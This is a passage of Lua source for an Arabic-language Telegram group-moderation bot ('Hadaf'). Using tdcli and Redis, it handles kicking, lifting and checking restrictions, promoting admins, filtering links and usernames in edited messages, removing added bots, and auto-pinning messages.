tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=msg.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"⚠️┇ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if (data and data.code_ and data.code_ == 3) then 
send(msg.chat_id_, msg.id_,"⚠️┇ أنا ليس ادمن يرجى ترقيتي !") 
return false  
end
if data and data.code_ and data.code_ == 400 and data.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_, msg.id_,"⚠️┇ عذرًا لا استطيع طرد ادمنية المجموعه") 
return false  
end
if data and data.ID and data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"🚷┇ تم طردك من المجموعه ") 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = msg.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
return false
end
end,nil)   
else
send(msg.chat_id_, msg.id_,"⚠️┇ امر اطردني تم تعطيله من قبل المدراء ") 
end
elseif text and text:match("^الغاء القيود @(.*)") and Owner(msg) then 
local username = text:match("^الغاء القيود @(.*)") 
function Function_Status(extra, result, success)
if result.id_ then
if Dev_Hadaf(msg) then
redis:srem(bot_id.."Hadaf:Removal:User:Groups",result.id_)
redis:srem(bot_id.."Hadaf:Removal:User:Group"..msg.chat_id_,result.id_)
redis:srem(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","\n📫┇ تم الغاء القيود عنه")  
else
redis:srem(bot_id.."Hadaf:Removal:User:Group"..msg.chat_id_,result.id_)
redis:srem(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","\n📫┇ تم الغاء القيود عنه")  
end
else
send(msg.chat_id_, msg.id_,"📫┇ المعرف غلط")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Status, nil)
elseif text == "الغاء القيود" and Owner(msg) then
function Function_Status(extra, result, success)
if Dev_Hadaf(msg) then
redis:srem(bot_id.."Hadaf:Removal:User:Groups",result.sender_user_id_)
redis:srem(bot_id.."Hadaf:Removal:User:Group"..msg.chat_id_,result.sender_user_id_)
redis:srem(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","\n📫┇ تم الغاء القيود عنه")  
else
redis:srem(bot_id.."Hadaf:Removal:User:Group"..msg.chat_id_,result.sender_user_id_)
redis:srem(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","\n📫┇ تم الغاء القيود عنه")  
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Status, nil)
elseif text and text:match("^كشف القيود @(.*)") and Owner(msg) then 
local username = text:match("^كشف القيود @(.*)") 
function Function_Status(extra, result, success)
if result.id_ then
if redis:sismember(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,result.id_) then
Muted = "مكتوم"
else
Muted = "غير مكتوم"
end
if redis:sismember(bot_id.."Hadaf:Removal:User:Group"..msg.chat_id_,result.id_) then
Ban = "محظور"
else
Ban = "غير محظور"
end
if redis:sismember(bot_id.."Hadaf:Removal:User:Groups",result.id_) then
GBan = "محظور عام"
else
GBan = "غير محظور عام"
end
send(msg.chat_id_, msg.id_,"💢┇ الحظر العام ← "..GBan.."\n⚠️️┇ الحظر ← "..Ban.."\n🔖┇ الكتم ← "..Muted)
else
send(msg.chat_id_, msg.id_,"📫┇ المعرف غلط")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Status, nil)
elseif text == "كشف القيود" and Owner(msg) then 
function Function_Status(extra, result, success)
if redis:sismember(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,result.sender_user_id_) then
Muted = "مكتوم"
else
Muted = "غير مكتوم"
end
if redis:sismember(bot_id.."Hadaf:Removal:User:Group"..msg.chat_id_,result.sender_user_id_) then
Ban = "محظور"
else
Ban = "غير محظور"
end
if redis:sismember(bot_id.."Hadaf:Removal:User:Groups",result.sender_user_id_) then
GBan = "محظور عام"
else
GBan = "غير محظور عام"
end
send(msg.chat_id_, msg.id_,"💢┇ الحظر العام ← "..GBan.."\n⚠️️┇ الحظر ← "..Ban.."\n🔖┇ الكتم ← "..Muted)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Status, nil)
elseif text ==("رفع الادمنيه") and Owner(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local num2 = 0
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
redis:sadd(bot_id..'Hadaf:Admin:Group'..msg.chat_id_, admins[i].user_id_)
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
if b.username_ == true then
end
if b.first_name_ == false then
redis:srem(bot_id..'Hadaf:Admin:Group'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
redis:sadd(bot_id..'Hadaf:Admin:Group'..msg.chat_id_, admins[i].user_id_)
end
end
if num2 == 0 then
send(msg.chat_id_, msg.id_,"💥┇ لا توجد ادمنية ليتم رفعهم") 
else
send(msg.chat_id_, msg.id_,"🔘┇ تمت ترقية - "..num2.." من ادمنية المجموعه") 
end
end,nil)   
elseif text ==("المنشئ") then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
if b.first_name_ == false then
send(msg.chat_id_, msg.id_,"🔘┇ حساب المنشئ محذوف")
return false  
end
local UserName = (b.username_ or "i3mrz")
send(msg.chat_id_, msg.id_,"🚸┇منشئ المجموعه ~ ["..b.first_name_.."](T.me/"..UserName..")")  
end,nil)   
end
end
end,nil)   
elseif text ==("رفع المنشئ") and DeveloperBot(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
end
end
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
if b.first_name_ == false then
send(msg.chat_id_, msg.id_,"⚠️┇حساب المنشئ محذوف")
return false  
end
local UserName = (b.username_ or "i3mrz")
send(msg.chat_id_, msg.id_,"🚸┇تم ترقية منشئ المجموعه ← ["..b.first_name_.."](T.me/"..UserName..")")  
redis:sadd(bot_id.."Hadaf:President:Group"..msg.chat_id_,b.id_)
end,nil)   
end,nil)   
elseif text and text:match("^تعيين عدد الاعضاء (%d+)$") and Dev_Hadaf(msg) then
redis:set(bot_id..'Hadaf:Num:Add:Bot',text:match("تعيين عدد الاعضاء (%d+)$") ) 
send(msg.chat_id_, msg.id_,'*✅┇ تم تعيين عدد اعضاء تفعيل البوت اكثر من : '..text:match("تعيين عدد الاعضاء (%d+)$")..' عضو *')
elseif text =='الاحصائيات' and DeveloperBot(msg) then 
send(msg.chat_id_, msg.id_,'*📋┇عدد احصائيات البوت الكامله \n━━━━━━━━━━━━━\n📮┇عدد المجموعات : '..(redis:scard(bot_id..'Hadaf:ChekBotAdd') or 0)..'\n👤┇عدد المشتركين : '..(redis:scard(bot_id..'Hadaf:Num:User:Pv') or 0)..'*')
elseif text == 'المطور' or text == 'مطور' then
local TextingDevHadaf = redis:get(bot_id..'Hadaf:Texting:DevHadaf')
if TextingDevHadaf then 
send(msg.chat_id_, msg.id_,TextingDevHadaf)
else
send(msg.chat_id_, msg.id_,'['..UserName_Dev..']')
end
elseif text == 'حذف كليشه المطور' and Dev_Hadaf(msg) then
redis:del(bot_id..'Hadaf:Texting:DevHadaf')
send(msg.chat_id_, msg.id_,'✅┇ تم حذف كليشه المطور')
end
end

------------------------------------------------------
end
end
------------------------------------------------------------------------------------------------------------
function tdcli_update_callback(data)
if data.ID == ("UpdateChannel") then 
if data.channel_.status_.ID == ("ChatMemberStatusKicked") then 
redis:srem(bot_id..'Hadaf:ChekBotAdd','-100'..data.channel_.id_)  
end
elseif data.ID == ("UpdateNewMessage") then
msg = data.message_
text = msg.content_.text_
if msg.date_ and msg.date_ < tonumber(os.time() - 30) then
print("->> Old Message End <<-")
return false
end
------------------------------------------------------------------------------------------------------------
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
redis:set(bot_id..'Hadaf:Save:Username'..msg.sender_user_id_,data.username_)
end;end,nil)   
--------------------------------------------------------------------------------------------------------------
if text and redis:get(bot_id.."Hadaf:Command:Reids:Group:Del"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = redis:get(bot_id.."Hadaf:Get:Reides:Commands:Group"..msg.chat_id_..":"..text)
if NewCmmd then
redis:del(bot_id.."Hadaf:Get:Reides:Commands:Group"..msg.chat_id_..":"..text)
redis:del(bot_id.."Hadaf:Command:Reids:Group:New"..msg.chat_id_)
redis:srem(bot_id.."Hadaf:Command:List:Group"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"✅┇تم ازالة هذا ← { "..text.." }")  
else
send(msg.chat_id_, msg.id_,"⚠️┇لا يوجد امر بهذا الاسم")  
end
redis:del(bot_id.."Hadaf:Command:Reids:Group:Del"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
------------------------------------------------------------------------------------------------------------
if text and redis:get(bot_id.."Hadaf:Command:Reids:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
redis:set(bot_id.."Hadaf:Command:Reids:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"⚠️️┇ارسل الامر الجديد ليتم وضعه مكان القديم")  
redis:del(bot_id.."Hadaf:Command:Reids:Group"..msg.chat_id_..":"..msg.sender_user_id_)
redis:set(bot_id.."Hadaf:Command:Reids:Group:End"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
------------------------------------------------------------------------------------------------------------
if text and redis:get(bot_id.."Hadaf:Command:Reids:Group:End"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = redis:get(bot_id.."Hadaf:Command:Reids:Group:New"..msg.chat_id_)
redis:set(bot_id.."Hadaf:Get:Reides:Commands:Group"..msg.chat_id_..":"..text,NewCmd)
redis:sadd(bot_id.."Hadaf:Command:List:Group"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"✅┇تم حفظ الامر باسم ← { "..text..' }')  
redis:del(bot_id.."Hadaf:Command:Reids:Group:End"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
------------------------------------------------------------------------------------------------------------
if tonumber(msg.sender_user_id_) ~= tonumber(bot_id) then  
if msg.sender_user_id_ and RemovalUserGroup(msg.chat_id_,msg.sender_user_id_) then 
KickGroup(msg.chat_id_,msg.sender_user_id_) 
Delete_Message(msg.chat_id_, {[0] = msg.id_}) 
return false  
elseif msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and RemovalUserGroup(msg.chat_id_,msg.content_.members_[0].id_) then 
KickGroup(msg.chat_id_,msg.content_.members_[0].id_) 
Delete_Message(msg.chat_id_, {[0] = msg.id_}) 
return false
elseif msg.sender_user_id_ and RemovalUserGroups(msg.sender_user_id_) then 
KickGroup(msg.chat_id_,msg.sender_user_id_) 
Delete_Message(msg.chat_id_, {[0] = msg.id_}) 
return false 
elseif msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and RemovalUserGroups(msg.content_.members_[0].id_) then 
KickGroup(msg.chat_id_,msg.content_.members_[0].id_) 
Delete_Message(msg.chat_id_, {[0] = msg.id_})  
return false  
elseif msg.sender_user_id_ and MutedGroups(msg.chat_id_,msg.sender_user_id_) then 
Delete_Message(msg.chat_id_, {[0] = msg.id_})  
return false  
end
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == "MessagePinMessage" or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == "MessageChatChangeTitle" or msg.content_.ID == "MessageChatDeleteMember" then   
if redis:get(bot_id.."Hadaf:Lock:tagservr"..msg.chat_id_) then  
Delete_Message(msg.chat_id_,{[0] = msg.id_})       
return false
end    
elseif text and not redis:sismember(bot_id..'Hadaf:Spam_For_Bot'..msg.sender_user_id_,text) then
redis:del(bot_id..'Hadaf:Spam_For_Bot'..msg.sender_user_id_) 
elseif msg.content_.ID == "MessageChatAddMembers" then  
redis:set(bot_id.."Hadaf:Who:Added:Me"..msg.chat_id_..":"..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = redis:get(bot_id.."Hadaf:Lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Admin(msg) and Bots == "kick" then   
https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
Get_Info = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Get_Info)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_Admin(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
elseif msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
local Bots = redis:get(bot_id.."Hadaf:Lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Admin(msg) and Bots == "del" then   
Get_Info = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Get_Info)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_Admin(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
if text and text:match('^'..(redis:get(bot_id.."Hadaf:Redis:Name:Bot") or "هدف")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(redis:get(bot_id.."Hadaf:Redis:Name:Bot") or "هدف")..' ','')
end
if text then
local NewCmmd = redis:get(bot_id.."Hadaf:Get:Reides:Commands:Group"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
--------------------------------------------------------------------------------------------------------------
Dev_Hadaf_File(msg,data)
elseif data.ID == ("UpdateMessageEdited") then
tdcli_function ({ID = "GetMessage",chat_id_ = data.chat_id_,message_id_ = tonumber(data.message_id_)},function(extra, result, success)
local textedit = result.content_.text_
redis:incr(bot_id..'Hadaf:Num:Message:Edit'..result.chat_id_..result.sender_user_id_)
if redis:get(bot_id.."Hadaf:Lock:edit"..msg.chat_id_) and not textedit and not PresidentGroup(result) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
Send_Options(result,result.sender_user_id_,"reply","⚠️┇قام بالتعديل على الوسائط")  
end
if not Vips(result) then
------------------------------------------------------------------------
if textedit and textedit:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]") or textedit and textedit:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt].[Mm][Ee]") or textedit and textedit:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if redis:get(bot_id.."Hadaf:Lock:Link"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
elseif textedit and textedit:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt].[Mm][Ee]") or textedit and textedit:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if redis:get(bot_id.."Hadaf:Lock:Link"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
elseif textedit and textedit:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt].[Mm][Ee]") or textedit and textedit:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if redis:get(bot_id.."Hadaf:Lock:Link"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt].[Mm][Ee]") or textedit and textedit:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if redis:get(bot_id.."Hadaf:Lock:Link"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("[hH][tT][tT][pP][sT]") or textedit and textedit:match("[tT][eE][lL][eE][gG][rR][aA].[Pp][Hh]") or textedit and textedit:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa].[Pp][Hh]") then
if redis:get(bot_id.."Hadaf:Lock:Link"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("(.*)(@)(.*)") then
if redis:get(bot_id.."Hadaf:Lock:User:Name"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("@") then
if redis:get(bot_id.."Hadaf:Lock:User:Name"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("(.*)(#)(.*)") then
if redis:get(bot_id.."Hadaf:Lock:hashtak"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("#") then
if redis:get(bot_id.."Hadaf:Lock:hashtak"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("/") then
if redis:get(bot_id.."Hadaf:Lock:Cmd"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
elseif textedit and textedit:match("(.*)(/)(.*)") then
if redis:get(bot_id.."Hadaf:Lock:Cmd"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
elseif textedit then
local Text_Filter = redis:get(bot_id.."Hadaf:Filter:Reply2"..textedit..result.chat_id_)   
if Text_Filter then    
Delete_Message(result.chat_id_, {[0] = data.message_id_})     
Send_Options(result,result.sender_user_id_,"reply","⚠️┇"..Text_Filter)  
return false
end
end
end
end,nil)
elseif data.ID == ("UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local Get_Msg_Pin = redis:get(bot_id..'Hadaf:Msg:Pin:Chat'..msg.chat_id_)
if Get_Msg_Pin ~= nil then
if text == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) if d.ID == 'Ok' then;redis:del(bot_id..'Hadaf:Msg:Pin:Chat'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if Get_Msg_Pin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) redis:del(bot_id..'Hadaf:Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) redis:del(bot_id..'Hadaf:Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) redis:del(bot_id..'Hadaf:Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
end
elseif data.ID == ("UpdateOption") and data.value_.value_ == ("Ready") then
local list = redis:smembers(bot_id..'Hadaf:Num:User:Pv')  
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end 
local list = redis:smembers(bot_id..'Hadaf:ChekBotAdd') 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
redis:srem(bot_id..'Hadaf:ChekBotAdd',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
redis:srem(bot_id..'Hadaf:ChekBotAdd',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
redis:srem(bot_id..'Hadaf:ChekBotAdd',v)  
end
if data and data.code_ and data.code_ == 400 then
redis:srem(bot_id..'Hadaf:ChekBotAdd',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
redis:sadd(bot_id..'Hadaf:ChekBotAdd',v)  
end 
end,nil)
end
end
end










